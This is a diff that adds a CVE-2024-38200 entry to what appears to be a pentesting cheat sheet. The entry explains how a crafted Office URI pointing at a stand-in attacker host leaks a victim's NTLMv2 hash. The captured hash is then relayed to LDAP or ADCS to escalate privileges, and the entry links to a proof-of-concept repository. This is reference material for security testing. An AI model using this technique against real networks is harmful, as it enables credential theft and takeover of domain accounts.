@@ -344,6 +344,12 @@ pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # with custom key and c
 
 * S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener	
 
+## CVE-2024-38200
+CVE-2024-38200 enables the capture of victim users' NTLMv2 hashes over SMB and HTTP by leveraging the Office URI Schema.<br>
+If we add a DNS A record and use this record name within the Office URI Schema (e.g., ms-word:ofe|u|http://attacker/leak.docx), Windows will consider the hostname as part of the Intranet Zone by default. In this way, NTLMv2 authentication occurs automatically when an Office application fetches a document from a remote source via crafted `ms-word:ofe|u|http://attacker/leak.docx` Office URI. The only requirement is for the victim user to visit the URL of an HTML file that redirects to the `ms-word:ofe|u|http://attacker/leak.docx`. A standard user can escalate privileges with LDAP relaying when this attack is performed against privileged user (e.g., enterprise admin, domain admin). <br>
+Capturing the NTLMv2 hash over HTTP method was not fixed (a warning box still does not apper). The NTLMv2 hash value can still be obtained over HTTP and relayed to LDAP or ADCS.
+
+https://github.com/passtheticket/CVE-2024-38200
 
 ## References
 
